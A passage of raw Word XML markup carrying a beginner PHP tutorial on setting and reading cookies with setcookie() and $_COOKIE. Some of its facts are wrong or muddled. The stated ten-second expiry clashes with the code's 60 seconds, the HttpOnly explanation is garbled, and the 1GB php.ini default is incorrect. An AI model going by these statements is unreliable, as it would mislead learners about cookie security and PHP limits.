            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> and its sub domains. Note it’s possible to have a subdomain of a subdomain as long as the total characters do not exceed 253 characters.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="86" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="87" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>“[</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>secure</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>]” is optional, the default is false. It is used to determine whether the cookie is sent via https if it is set to true or http if it is set to false.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="88" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="89" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> “[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Httponly</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>]” is optional. If it is set to true, then only client side scripting languages i.e.</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/interactive-javascript-tutorials.html" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> JavaScript </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cannot access them.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="90" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="91" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">Note: the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> set cookie function must be executed before the HTML opening tag.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="92" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="93" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Let’s now look at an example that uses cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="94" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="95" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">We will create a basic program that allows us to store the user name in a cookie that expires </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>after  ten</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> seconds.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="96" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="97" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The code below shows the implementation of the above example “</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookies.php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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98" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="99"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206B25" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="100" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="101" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">     </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>setcookie</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>"</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>user_name</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>", "Guru99", time()+ 60,'/'); // expires after 60 seconds</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="102" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="103" w:author="Unknown">
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t xml:space="preserve">     </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>echo</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t xml:space="preserve"> 'the cookie has been set for 60 seconds';</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="104" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="105" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="106" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="107" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Retrieving the Cookie value</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="108" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="109" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Create another file named “</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookies_read.php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>” with the following code.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="110" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="111"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112" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="113" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">     </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>print_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">$_COOKIE);    //output the contents of the cookie array variable </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="114" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="115" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="116" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="117" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>  Note: $_COOKIE is a PHP built in super global variable.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="118" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="119" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>It contains the names and values of all the set cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="120" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="121" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The number of values that the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="122" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="123" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>$_COOKIE array can contain depends on the memory size set in php.ini.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="124" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="125" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>The default value is 1GB.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="126" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
